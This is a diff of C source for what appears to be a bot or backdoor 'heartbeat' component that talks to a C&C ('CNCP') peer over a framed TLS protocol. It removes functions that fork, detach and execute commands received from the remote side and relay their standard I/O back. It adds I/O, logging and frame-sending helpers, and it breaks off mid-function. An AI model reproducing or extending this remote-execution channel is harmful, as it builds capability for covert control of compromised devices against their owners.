@@ -35,17 +35,22 @@
 static const struct timespec HTBT_CNCP_STREAM_TIMEOUT = { 1800, 0 }; // 30m
 // Slave Socket Operation Timeout
 static const struct timespec HTBT_SLV_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
-// Slave Status Send Timeout
-static const struct timespec HTBT_SLV_STATUS_SND_TIMEOUT = { 5, 0 }; // 5s
 // LBD Socket Bind Retry Interval
 static const struct timespec HTBT_LBD_BIND_INT = { 5, 0 }; // 5s
 // TLS Close Timeout
 static const struct timespec HTBT_CLOSE_TIMEOUT = { 3, 0 }; // 3s
 // Relay child Timeout
 static const struct timespec HTBT_RELAY_CHILD_TIMEOUT = { 60, 0 }; // 60s
+static const struct timespec HTBT_CHILD_WAIT_INT = { 1, 0 }; // 1s
+static const struct timespec HTBT_CHILD_SPAWN_TIMEOUT = { 30, 0 }; // 30s
 // Download tick timeout
 static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s
 
+static const size_t HTBT_STDIO_IB_SIZE[] = {
+	PRNE_HTBT_STDIO_LEN_MAX,
+	512,
+	0
+};
 
 #define HTBT_NT_MAIN "htbt_main"
 #define HTBT_NT_LBD "htbt_lbd"
@@ -76,10 +81,8 @@ typedef struct {
 	const prne_htbt_cbset_t *cbset;
 	void *cb_ctx;
 	const prne_rcb_param_t *rcb;
-	size_t skip;
 	prne_iobuf_t iobuf[2];
 	prne_pth_cv_t cv;
-	bool valid;
 } htbt_slv_ctx_t;
 
 typedef struct {
@@ -315,464 +318,12 @@ static void htbt_main_empty_req_q (prne_htbt_t *ctx) {
 	prne_llist_clear(&ctx->main.req_q);
 }
 
-/* htbt_relay_child()
-*/
-static prne_htbt_status_code_t htbt_relay_child (
-	htbt_slv_ctx_t *ctx,
-	const uint16_t msg_id,
-	int *c_in,
-	int *c_out,
-	int *c_err)
-{
-	prne_htbt_status_code_t ret = PRNE_HTBT_STATUS_OK;
-	struct pollfd pfd[5];
-	prne_htbt_msg_head_t mh;
-	prne_htbt_stdio_t sh[2];
-	int f_ret, pending, out_p = 0;
-	size_t actual;
-	ssize_t consume;
-	pth_event_t ev = NULL;
-
-	pfd[0].fd = ctx->fd[0];
-	pfd[1].fd = ctx->fd[1];
-	pfd[2].fd = *c_in;
-	pfd[3].fd = *c_out;
-	pfd[4].fd = *c_err;
-	prne_htbt_init_msg_head(&mh);
-	prne_htbt_init_stdio(sh + 0);
-	prne_htbt_init_stdio(sh + 1);
-
-	while ((!sh[0].fin && sh[0].len > 0) || // has pending stdin data
-		ctx->iobuf[1].len > 0 || // has pending stdout data
-		pfd[3].fd >= 0 || // child stdout is still open
-		pfd[4].fd >= 0) // child stdout is still open
-	{
-		// Setup events
-		if (ctx->iobuf[0].avail > 0 && !(sh[0].fin && sh[0].len == 0)) {
-			pfd[0].events = POLLIN;
-		}
-		else {
-			pfd[0].events = 0;
-		}
-
-		pfd[1].events = ctx->iobuf[1].len > 0 ? POLLOUT : 0;
-
-		if (sh[0].len > 0 && ctx->iobuf[0].len > 0) {
-			pfd[2].events = POLLOUT;
-		}
-		else {
-			pfd[2].events = 0;
-		}
-
-		if (ctx->iobuf[1].len == 0 && sh[1].len == 0) {
-			pfd[3].events = pfd[4].events = POLLIN;
-		}
-		else if (ctx->iobuf[1].len > 0) {
-			pfd[3].events = pfd[4].events = 0;
-		}
-		else if (sh[1].len) {
-			pfd[3 + out_p].events = POLLIN;
-		}
-
-		pfd[0].revents =
-			pfd[1].revents =
-			pfd[2].revents =
-			pfd[3].revents =
-			pfd[4].revents = 0;
-
-		if (ctx->pending_f(ctx->ioctx)) {
-			// pending data in the buffer
-			// make it so that ctx->read_f() is called again
-			pfd[0].revents = POLLIN;
-		}
-		else {
-			// Do poll
-			/* FIXME
-			* Await cv if you want to terminate the connection right away
-			* when the program is terminating.
-			*/
-			pth_event_free(ev, FALSE);
-			ev = pth_event(
-				PTH_EVENT_TIME,
-				prne_pth_tstimeout(HTBT_RELAY_CHILD_TIMEOUT));
-			prne_assert(ev != NULL);
-
-			f_ret = prne_pth_poll(pfd, 5, -1, ev);
-			if (f_ret < 0) {
-				ret = PRNE_HTBT_STATUS_ERRNO;
-				break;
-			}
-			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
-				ret = PRNE_HTBT_STATUS_TIMEDOUT;
-				break;
-			}
-		}
-
-		// Handle events
-		if (pfd[0].revents) {
-			f_ret = ctx->read_f(
-				ctx->ioctx,
-				ctx->iobuf[0].m + ctx->iobuf[0].len,
-				ctx->iobuf[0].avail);
-			if (f_ret == 0) {
-				pfd[0].fd = -1;
-			}
-			else if (f_ret < 0) {
-				if (!prne_is_nberr(errno)) {
-					ctx->valid = false;
-					break;
-				}
-			}
-			else {
-				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
-			}
-		}
-
-		if (pfd[1].revents) {
-			f_ret = ctx->write_f(
-				ctx->ioctx,
-				ctx->iobuf[1].m,
-				ctx->iobuf[1].len);
-			if (f_ret < 0) {
-				if (!prne_is_nberr(errno)) {
-					ctx->valid = false;
-					break;
-				}
-			}
-			else if (f_ret == 0) {
-				ctx->valid = false;
-				break;
-			}
-			else {
-				prne_iobuf_shift(ctx->iobuf + 1, -f_ret);
-				if (pending > 0) {
-					pending -= f_ret;
-				}
-				else {
-					sh[1].len -= f_ret;
-				}
-			}
-		}
-
-		if (ctx->iobuf[1].len == 0 && sh[1].len == 0) {
-			if (pfd[3].revents && pfd[4].revents) {
-				// round-robin stdout and stderr
-				out_p = (out_p + 1) % 2;
-			}
-			else if (pfd[3].revents) {
-				out_p = 0;
-			}
-			else if (pfd[4].revents) {
-				out_p = 1;
-			}
-		}
-
-		if (pfd[3 + out_p].revents) {
-			if (sh[1].len == 0) {
-/*
-* FIONREAD is not standardised. On platforms where it's not supported, ioctl()
-* fails or pending is always 0. The former case is fatal. The latter case
-* results in a weird bug.
-*/
-				prne_assert(ioctl(pfd[3 + out_p].fd, FIONREAD, &pending) == 0);
-
-				sh[1].len = (size_t)prne_op_min(
-					pending,
-					PRNE_HTBT_STDIO_LEN_MAX);
-				sh[1].err = out_p != 0;
-				sh[1].fin = sh[1].len == 0;
-				mh.id = msg_id;
-				mh.is_rsp = true;
-				mh.op = PRNE_HTBT_OP_STDIO;
-
-				prne_assert(prne_htbt_ser_msg_head(
-					ctx->iobuf[1].m + ctx->iobuf[1].len,
-					ctx->iobuf[1].avail,
-					&actual,
-					&mh) == PRNE_HTBT_SER_RC_OK);
-				pending = (int)actual;
-				prne_assert(prne_htbt_ser_stdio(
-					ctx->iobuf[1].m + ctx->iobuf[1].len + pending,
-					ctx->iobuf[1].avail - pending,
-					&actual,
-					sh + 1) == PRNE_HTBT_SER_RC_OK);
-				pending += (int)actual;
-				prne_iobuf_shift(ctx->iobuf + 1, pending);
-
-				if (sh[1].fin) {
-					pfd[3 + out_p].fd = -1;
-				}
-			}
-			else {
-				f_ret = read(
-					pfd[3 + out_p].fd,
-					ctx->iobuf[1].m + ctx->iobuf[1].len,
-					prne_op_min(sh[1].len, ctx->iobuf[1].avail));
-				prne_dbgast(f_ret > 0);
-				prne_iobuf_shift(ctx->iobuf + 1, f_ret);
-			}
-		}
-
-		if (!sh[0].fin && sh[0].len == 0) {
-			do {
-				if (prne_htbt_dser_msg_head(
-					ctx->iobuf[0].m,
-					ctx->iobuf[0].len,
-					&actual,
-					&mh) != PRNE_HTBT_SER_RC_OK)
-				{
-					break;
-				}
-				consume = actual;
-				if (mh.id != msg_id ||
-					mh.is_rsp ||
-					mh.op != PRNE_HTBT_OP_STDIO)
-				{
-					sh[0].fin = true;
-					break;
-				}
-				if (prne_htbt_dser_stdio(
-					ctx->iobuf[0].m + consume,
-					ctx->iobuf[0].len - consume,
-					&actual,
-					sh + 0) != PRNE_HTBT_SER_RC_OK)
-				{
-					break;
-				}
-				consume += actual;
-				prne_iobuf_shift(ctx->iobuf + 0, -consume);
-			} while (false);
-
-			if (sh[0].len == 0 && pfd[0].fd < 0) {
-				// There's still pending stdin data and EOF.
-				// This is proto err.
-				ret = PRNE_HTBT_STATUS_PROTO_ERR;
-				break;
-			}
-		}
-
-		consume = prne_op_min(ctx->iobuf[0].len, sh[0].len);
-		if (pfd[2].fd < 0 && sh[0].len > 0) {
-			// Stdin data coming in, but the child has already closed stdin
-			prne_iobuf_shift(ctx->iobuf + 0, -consume);
-			sh[0].len -= consume;
-		}
-		else if (pfd[2].revents) {
-			f_ret = write(*c_in, ctx->iobuf[0].m, consume);
-			if (f_ret > 0) {
-				consume = f_ret;
-			}
-			else {
-				pfd[2].fd = -1;
-			}
-
-			prne_iobuf_shift(ctx->iobuf + 0, -consume);
-			sh[0].len -= consume;
-		}
-
-		if (sh[0].fin && sh[0].len == 0 && pfd[2].fd >= 0) {
-			// End of stdin stream
-			close(*c_in);
-			*c_in = -1;
-			pfd[2].fd = -1;
-		}
-	}
-
-	prne_htbt_free_stdio(sh + 0);
-	prne_htbt_free_stdio(sh + 1);
-	prne_htbt_free_msg_head(&mh);
-	pth_event_free(ev, FALSE);
-
-	return ret;
-}
-
-/* htbt_do_cmd()
-*
-* Give flushed output buffer.
-*/
-static void htbt_do_cmd (
-	const bool detach,
-	char *const *args,
-	htbt_slv_ctx_t *ctx,
-	const uint16_t msg_id,
-	prne_htbt_status_code_t *out_status,
-	int32_t *out_err)
-{
-	int cin[2] = { -1, -1 };
-	int cout[2] = { -1, -1 };
-	int cerr[2] = { -1, -1 };
-	int errp[2] = { -1, -1 };
-	pid_t child = -1;
-	int f_ret, chld_status;
-	prne_htbt_status_code_t ret_status;
-	int32_t ret_err = 0;
-
-	if (pipe(errp) != 0 ||
-		fcntl(errp[0], F_SETFD, FD_CLOEXEC) != 0 ||
-		fcntl(errp[1], F_SETFD, FD_CLOEXEC) != 0)
-	{
-		ret_status = PRNE_HTBT_STATUS_ERRNO;
-		ret_err = errno;
-		goto END;
-	}
-	if (!detach &&
-		(pipe(cin) != 0 || pipe(cout) != 0 || pipe(cerr) != 0))
-	{
-		ret_status = PRNE_HTBT_STATUS_ERRNO;
-		ret_err = errno;
-		goto END;
-	}
-
-	child = pth_fork();
-	if (child == 0) {
-		do { // TRY
-			close(errp[0]);
-
-			if (detach) {
-				child = fork();
-				if (child < 0) {
-					break;
-				}
-				else if (child > 0) {
-					exit(0);
-				}
-
-				setsid();
-				close(STDIN_FILENO);
-				// Inherit these if DEBUG
-#if !PRNE_DEBUG
-				close(STDOUT_FILENO);
-				close(STDERR_FILENO);
-#endif
-			}
-			else {
-				close(cin[1]);
-				close(cout[0]);
-				close(cerr[0]);
-				if (prne_chfd(cin[0], STDIN_FILENO) != STDIN_FILENO ||
-					prne_chfd(cout[1], STDOUT_FILENO) != STDOUT_FILENO ||
-					prne_chfd(cerr[1], STDERR_FILENO) != STDERR_FILENO)
-				{
-					break;
-				}
-			}
-
-			execv(args[0], args);
-		} while (false);
-		// CATCH
-		ret_err = errno;
-		write(errp[1], &ret_err, sizeof(int32_t));
-		raise(SIGKILL);
-	}
-	else if (child < 0) {
-		ret_status = PRNE_HTBT_STATUS_ERRNO;
-		ret_err = errno;
-		goto END;
-	}
-
-	// The parent continues ...
-	close(errp[1]);
-
-	// This could block forever if the child gets stoppep
-	f_ret = pth_read(errp[0], &ret_err, sizeof(int32_t));
-	if (f_ret == sizeof(int32_t)) {
-		ret_status = PRNE_HTBT_STATUS_ERRNO;
-		goto END;
-	}
-	prne_close(errp[0]);
-	errp[0] = -1;
-
-	/* CAVEAT
-	* You might want to wait on cv, but there's no way to waitpid() and
-	* cond_await() at the same time with pth.
-	*/
-	ret_status = PRNE_HTBT_STATUS_OK;
-	if (detach) {
-		if (pth_waitpid(child, &chld_status, WUNTRACED) == child &&
-			!WIFSTOPPED(chld_status))
-		{
-			child = -1;
-			ret_err = 0;
-		}
-	}
-	else {
-		prne_close(cin[0]);
-		prne_close(cout[1]);
-		prne_close(cerr[1]);
-		cin[0] = cout[1] = cerr[1] = errp[1] = -1;
-		if (!prne_sck_fcntl(cin[1]) ||
-			!prne_sck_fcntl(cout[0]) ||
-			!prne_sck_fcntl(cerr[0]))
-		{
-			ret_status = PRNE_HTBT_STATUS_ERRNO;
-			ret_err = errno;
-			goto END;
-		}
-
-		ret_status = htbt_relay_child(
-			ctx,
-			msg_id,
-			&cin[1],
-			&cout[0],
-			&cerr[0]);
-		if (ret_status != PRNE_HTBT_STATUS_OK) {
-			if (ret_status == PRNE_HTBT_STATUS_ERRNO) {
-				ret_err = errno;
-			}
-			goto END;
-		}
-
-		if (pth_waitpid(child, &chld_status, WUNTRACED) < 0) {
-			ret_status = PRNE_HTBT_STATUS_ERRNO;
-			ret_err = errno;
-			goto END;
-		}
-		else if (WIFEXITED(chld_status)) {
-			ret_err = WEXITSTATUS(chld_status);
-			child = -1;
-		}
-		else if (WIFSIGNALED(chld_status)) {
-			ret_err = 128 + WTERMSIG(chld_status);
-			child = -1;
-		}
-		else if (WIFSTOPPED(chld_status)) {
-			// child has been stopped just right before exit
-			ret_err = 128 + SIGSTOP;
-		}
-		else {
-			ret_err = -1; // WTF?
-		}
-	}
-
-END:
-	prne_close(cin[0]);
-	prne_close(cin[1]);
-	prne_close(cout[0]);
-	prne_close(cout[1]);
-	prne_close(cerr[0]);
-	prne_close(cerr[1]);
-	prne_close(errp[0]);
-	prne_close(errp[1]);
-	if (child > 0) {
-		kill(child, SIGKILL);
-		pth_waitpid(child, NULL, 0);
-	}
-
-	if (out_status != NULL) {
-		*out_status = ret_status;
-	}
-	if (out_err != NULL) {
-		*out_err = ret_err;
-	}
-}
-
 static void htbt_init_slv_ctx (htbt_slv_ctx_t *ctx) {
 	prne_memzero(ctx, sizeof(htbt_slv_ctx_t));
 	ctx->fd[0] = -1;
 	ctx->fd[1] = -1;
 	prne_init_iobuf(ctx->iobuf + 0);
 	prne_init_iobuf(ctx->iobuf + 1);
-	ctx->valid = true;
 }
 
 static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
@@ -799,395 +350,1241 @@ static bool htbt_alloc_slv_iobuf (htbt_slv_ctx_t *ctx) {
 #undef OPT_SIZE
 }
 
-static void htbt_slv_consume_outbuf (
+static void htbt_slv_on_ioerr (htbt_slv_ctx_t *ctx, const bool w) {
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		char msg[256];
+		const int saved_errno = errno;
+
+		snprintf(
+			msg,
+			sizeof(msg),
+			HTBT_NT_SLV"@%"PRIxPTR" %s",
+			(uintptr_t)ctx,
+			w ? "write" : "read");
+		errno = saved_errno;
+		prne_dbgperr(msg);
+	}
+}
+
+static void htbt_slv_on_ioeof (htbt_slv_ctx_t *ctx, const bool w) {
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": %s EOF\n",
+			(uintptr_t)ctx,
+			w ? "write" : "read");
+	}
+}
+
+static void htbt_slv_on_io (
 	htbt_slv_ctx_t *ctx,
-	const size_t req_size,
-	pth_event_t root_ev)
+	const bool w,
+	const uint8_t *p,
+	const size_t l)
 {
-	struct pollfd pfd;
-	int fret;
-
-	pfd.fd = ctx->fd[1];
-	pfd.events = POLLOUT;
-
-	while (ctx->valid && ctx->iobuf[1].len > 0) {
-		fret = prne_pth_poll(&pfd, 1, -1, root_ev);
-		if (root_ev != NULL &&
-			pth_event_status(root_ev) != PTH_STATUS_PENDING)
-		{
-			break;
-		}
-		if (fret == 1 && pfd.revents) {
-			fret = ctx->write_f(
-				ctx->ioctx,
-				ctx->iobuf[1].m,
-				ctx->iobuf[1].len);
-			if (fret <= 0) {
-				if (fret < 0 && prne_is_nberr(errno)) {
-					continue;
-				}
-				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
-					if (fret == 0) {
-						prne_dbgpf(
-							HTBT_NT_SLV"@%"PRIuPTR": write EOF.\n",
-							(uintptr_t)ctx);
-					}
-					else {
-						prne_dbgpf(
-							HTBT_NT_SLV"@%"PRIuPTR": write error: "
-							"ret=%d, errno=%d\n",
-							(uintptr_t)ctx,
-							fret,
-							errno);
-					}
-				}
-				ctx->valid = false;
-				break;
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": %s %zu bytes...\n",
+			(uintptr_t)ctx,
+			w ? ">" : "<",
+			l);
+		if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+			if (l == 0) {
+				prne_dbgpf("\n");
 			}
-			if (PRNE_DEBUG) {
-				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
-					prne_dbgpf(
-						HTBT_NT_SLV"@%"PRIuPTR": > %d bytes: ",
-						(uintptr_t)ctx,
-						fret);
-					for (int i = 0; i < fret; i += 1) {
-						prne_dbgpf("%02"PRIx8" ", ctx->iobuf[1].m[i]);
+			else {
+				for (size_t i = 0; i < l; ) {
+					for (size_t j = 0; j < 24 && i < l; i += 1, j += 1) {
+						prne_dbgpf("%02"PRIx8" ", p[i]);
 					}
 					prne_dbgpf("\n");
 				}
-				else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
-					prne_dbgpf(
-						HTBT_NT_SLV"@%"PRIuPTR": > %d bytes.\n",
-						(uintptr_t)ctx,
-						fret);
-				}
 			}
-			prne_iobuf_shift(ctx->iobuf + 1, -fret);
-		}
-		else {
-			break;
-		}
-
-		if (ctx->iobuf[1].avail >= req_size) {
-			break;
 		}
 	}
 }
 
-static void htbt_slv_fab_frame (
+static void htbt_slv_on_mh (
 	htbt_slv_ctx_t *ctx,
-	const prne_htbt_msg_head_t *mh,
-	const void *body,
-	prne_htbt_ser_ft ser_f,
-	pth_event_t ev)
+	const bool w,
+	const prne_htbt_msg_head_t *mh)
 {
-	size_t req, actual;
-
-	prne_assert(ev != NULL);
-	prne_assert(!((body == NULL) ^ (ser_f == NULL)));
-
-	req = 0;
-	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
-	req += actual;
-	if (ser_f != NULL) {
-		ser_f(NULL, 0, &actual, body);
-		req += actual;
-	}
-
-	prne_assert(req <= ctx->iobuf[1].size);
-	htbt_slv_consume_outbuf(ctx, req, ev);
-	if (!ctx->valid) {
-		return;
-	}
-
-	if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 #if PRNE_DEBUG
 		const char *opstr = prne_htbt_op_tostr(mh->op);
 #endif
 		prne_dbgpf(
-			HTBT_NT_SLV"@%"PRIuPTR": > %"PRIu16" %s(%d)\n",
+			HTBT_NT_SLV"@%"PRIuPTR": %s %"PRIX16"%s %s(%02x)\n",
 			(uintptr_t)ctx,
+			w ? ">" : "<",
 			mh->id,
+			mh->is_rsp ? "+" : " ",
 			opstr != NULL ? opstr : "?",
 			mh->op);
 	}
+}
 
-	prne_htbt_ser_msg_head(
-		ctx->iobuf[1].m + ctx->iobuf[1].len,
-		ctx->iobuf[1].avail,
-		&actual,
-		mh);
-	prne_iobuf_shift(ctx->iobuf + 1, actual);
-	if (ser_f != NULL) {
-		ser_f(
-			ctx->iobuf[1].m + ctx->iobuf[1].len,
-			ctx->iobuf[1].avail,
-			&actual,
-			body);
-		prne_iobuf_shift(ctx->iobuf + 1, actual);
+static void htbt_slv_on_status (
+	htbt_slv_ctx_t *ctx,
+	const bool w,
+	const prne_htbt_status_t *st)
+{
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": %s status code=%02x err=%x\n",
+			(uintptr_t)ctx,
+			w ? ">" : "<",
+			st->code,
+			st->err);
 	}
 }
 
-static void htbt_slv_fab_status (
+static void htbt_slv_on_stdio (
 	htbt_slv_ctx_t *ctx,
-	prne_htbt_status_code_t status,
-	int32_t err,
-	uint16_t corr_msgid,
+	const bool w,
+	const prne_htbt_stdio_t *stdio)
+{
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": %s stdio err(%s) fin(%s) len=%zu\n",
+			(uintptr_t)ctx,
+			w ? ">" : "<",
+			stdio->err ? "*" : " ",
+			stdio->fin ? "*" : " ",
+			stdio->len);
+	}
+}
+
+static ssize_t htbt_slv_read (
+	htbt_slv_ctx_t *ctx,
+	void *buf,
+	const size_t l,
 	pth_event_t ev)
 {
-	prne_htbt_msg_head_t mh;
-	prne_htbt_status_t s;
-	pth_event_t my_ev = NULL;
+	ssize_t f_ret;
+	struct pollfd pfd;
 
-	if (ev == NULL) {
-		my_ev = pth_event(
-			PTH_EVENT_TIME,
-			prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));
-		ev = my_ev;
+	while (true) {
+		f_ret = ctx->read_f(ctx->ioctx, buf, l);
+		if (f_ret > 0) {
+			htbt_slv_on_io(ctx, 0, (const uint8_t*)buf, f_ret);
+			break;
+		}
+		if (f_ret == 0) {
+			htbt_slv_on_ioeof(ctx, 0);
+			break;
+		}
+		if (!prne_is_nberr(errno)) {
+			htbt_slv_on_ioerr(ctx, 0);
+			return -1;
+		}
+
+		pfd.events = POLLIN;
+		pfd.fd = ctx->fd[0];
+		prne_pth_poll(&pfd, 1, -1, ev);
+		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
+			errno = ETIMEDOUT;
+			return -1;
+		}
 	}
-	prne_assert(ev != NULL);
 
-	prne_htbt_init_msg_head(&mh);
-	prne_htbt_init_status(&s);
-	mh.id = corr_msgid;
-	mh.is_rsp = true;
-	mh.op = PRNE_HTBT_OP_STATUS;
-	s.code = status;
-	s.err = err;
-
-	htbt_slv_fab_frame(
-		ctx,
-		&mh,
-		&s,
-		(prne_htbt_ser_ft)prne_htbt_ser_status,
-		ev);
-
-	prne_htbt_free_msg_head(&mh);
-	prne_htbt_free_status(&s);
-	pth_event_free(my_ev, FALSE);
+	return f_ret;
 }
 
-static void htbt_slv_fab_noop (
+static bool htbt_slv_skip (
 	htbt_slv_ctx_t *ctx,
-	const bool is_rsp,
+	size_t l,
 	pth_event_t ev)
 {
-	prne_htbt_msg_head_t mh;
+	ssize_t f_ret;
 
-	prne_htbt_init_msg_head(&mh);
-	mh.is_rsp = is_rsp;
-	htbt_slv_fab_frame(ctx, &mh, NULL, NULL, ev);
-	prne_htbt_free_msg_head(&mh);
-}
-
-static void htbt_slv_raise_protoerr (
-	htbt_slv_ctx_t *ctx,
-	uint16_t corr_msgid,
-	int32_t err)
-{
-	pth_event_t ev = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));
-
-	prne_assert(ev != NULL);
-	htbt_slv_fab_status(
-		ctx,
-		PRNE_HTBT_STATUS_PROTO_ERR,
-		err,
-		corr_msgid,
-		ev);
-	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev);
-	ctx->valid = false;
-
-	pth_event_free(ev, FALSE);
-}
-
-static bool htbt_slv_srv_stdio (
-	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
-{
-	bool ret = true;
-	prne_htbt_stdio_t sh;
-	size_t actual;
-	prne_htbt_ser_rc_t s_ret;
-
-	prne_htbt_init_stdio(&sh);
-
-	s_ret = prne_htbt_dser_stdio(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&sh);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		ret = false;
-		goto END;
-	}
-	else {
-		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_slv_raise_protoerr(
+	prne_iobuf_reset(ctx->iobuf + 0);
+	while (l > 0) {
+		f_ret = htbt_slv_read(
 			ctx,
-			mh->id,
-			0);
-		goto END;
+			ctx->iobuf[0].m,
+			prne_op_min(ctx->iobuf[0].avail, l),
+			ev);
+		if (f_ret <= 0) {
+			return false;
+		}
+		l -= f_ret;
 	}
 
-	ctx->skip = sh.len;
-END:
-	prne_htbt_free_stdio(&sh);
+	return true;
+}
+
+static ssize_t htbt_slv_write (
+	htbt_slv_ctx_t *ctx,
+	const void *buf,
+	const size_t l,
+	pth_event_t ev)
+{
+	ssize_t f_ret;
+	struct pollfd pfd;
+
+	while (true) {
+		f_ret = ctx->write_f(ctx->ioctx, buf, l);
+		if (f_ret > 0) {
+			htbt_slv_on_io(ctx, 1, (const uint8_t*)buf, f_ret);
+			break;
+		}
+		if (f_ret == 0) {
+			htbt_slv_on_ioeof(ctx, 1);
+			break;
+		}
+		if (!prne_is_nberr(errno)) {
+			htbt_slv_on_ioerr(ctx, 1);
+			return -1;
+		}
+
+		pfd.events = POLLOUT;
+		pfd.fd = ctx->fd[1];
+		prne_pth_poll(&pfd, 1, -1, ev);
+		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
+			errno = ETIMEDOUT;
+			return -1;
+		}
+	}
+
+	return f_ret;
+}
+
+static bool htbt_slv_wflush (
+	htbt_slv_ctx_t *ctx,
+	const void *buf,
+	size_t l,
+	pth_event_t ev)
+{
+	ssize_t io_ret;
+	const uint8_t *p = (const uint8_t*)buf;
+
+	while (l > 0) {
+		io_ret = htbt_slv_write(ctx, p, l, ev);
+		if (io_ret <= 0) {
+			return false;
+		}
+		l -= io_ret;
+		p += io_ret;
+	}
+
+	return true;
+}
+
+static bool htbt_slv_wflush_ib (
+	htbt_slv_ctx_t *ctx,
+	prne_iobuf_t *ib,
+	pth_event_t ev)
+{
+	const bool ret = htbt_slv_wflush(ctx, ib->m, ib->len, ev);
+	if (ret) {
+		prne_iobuf_reset(ib);
+	}
+	return ret;
+}
+
+static bool htbt_slv_send_frame (
+	htbt_slv_ctx_t *ctx,
+	const void *f,
+	prne_htbt_ser_ft ser_f,
+	pth_event_t ev)
+{
+	size_t actual;
+	prne_htbt_ser_rc_t rc;
+
+	prne_iobuf_reset(ctx->iobuf + 1);
+	rc = ser_f(ctx->iobuf[1].m, ctx->iobuf[1].avail, &actual, f);
+	switch (rc) {
+	case PRNE_HTBT_SER_RC_OK: break;
+	case PRNE_HTBT_SER_RC_MORE_BUF:
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+			prne_dbgpf(
+				HTBT_NT_SLV"@%"PRIuPTR": send frame too large "
+				"buf size=%zu actual=%zu\n",
+				(uintptr_t)ctx,
+				ctx->iobuf[1].size,
+				actual);
+		}
+		return false;
+	case PRNE_HTBT_SER_RC_ERRNO:
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+			char msg[256];
+			const int saved_errno = errno;
+
+			snprintf(
+				msg,
+				sizeof(msg),
+				HTBT_NT_SLV"@%"PRIxPTR" send ser_f",
+				(uintptr_t)ctx);
+			errno = saved_errno;
+			prne_dbgperr(msg);
+		}
+		return false;
+	default:
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+			prne_dbgpf(
+				HTBT_NT_SLV"@%"PRIuPTR": send ser_f returned %d\n",
+				(uintptr_t)ctx,
+				rc);
+		}
+		return false;
+	}
+
+	prne_iobuf_shift(ctx->iobuf + 1, actual);
+	return htbt_slv_wflush_ib(ctx, ctx->iobuf + 1, ev);
+}
+
+static bool htbt_slv_send_mh (
+	htbt_slv_ctx_t *ctx,
+	const prne_htbt_msg_head_t *f,
+	pth_event_t ev)
+{
+	htbt_slv_on_mh(ctx, 1, f);
+	return htbt_slv_send_frame(
+		ctx,
+		f,
+		(prne_htbt_ser_ft)prne_htbt_ser_msg_head,
+		ev);
+}
+
+static bool htbt_slv_send_status (
+	htbt_slv_ctx_t *ctx,
+	const uint16_t *corr_id,
+	const prne_htbt_status_code_t code,
+	const int32_t err,
+	pth_event_t ev)
+{
+	bool ret;
+	prne_htbt_msg_head_t mh;
+	prne_htbt_status_t st;
+
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_status(&st);
+
+	mh.op = PRNE_HTBT_OP_STATUS;
+	mh.is_rsp = true;
+	if (corr_id != NULL) {
+		mh.id = *corr_id;
+	}
+	st.code = code;
+	st.err = err;
+
+	htbt_slv_on_status(ctx, true, &st);
+	ret =
+		htbt_slv_send_mh(ctx, &mh, ev) &&
+		htbt_slv_send_frame(
+			ctx,
+			&st,
+			(prne_htbt_ser_ft)prne_htbt_ser_status,
+			ev);
+
+	prne_htbt_free_msg_head(&mh);
+	prne_htbt_free_status(&st);
+	return ret;
+}
+
+static bool htbt_slv_send_stdio (
+	htbt_slv_ctx_t *ctx,
+	prne_htbt_stdio_t *stdio,
+	pth_event_t ev)
+{
+	htbt_slv_on_stdio(ctx, true, stdio);
+	return htbt_slv_send_frame(
+		ctx,
+		stdio,
+		(prne_htbt_ser_ft)prne_htbt_ser_stdio,
+		ev);
+}
+
+#define htbt_slv_raise_protoerr(ctx, corr_id, err, ev, ...) {\
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {\
+		prne_dbgpf(\
+			HTBT_NT_SLV"@%"PRIuPTR": protocol error - ",\
+			(uintptr_t)ctx);\
+		prne_dbgpf(__VA_ARGS__);\
+		prne_dbgpf("\n");\
+		htbt_slv_send_status(\
+			ctx,\
+			corr_id,\
+			PRNE_HTBT_STATUS_PROTO_ERR,\
+			err,\
+			ev);\
+	}\
+}
+
+static bool htbt_slv_recv_frame (
+	htbt_slv_ctx_t *ctx,
+	void *f,
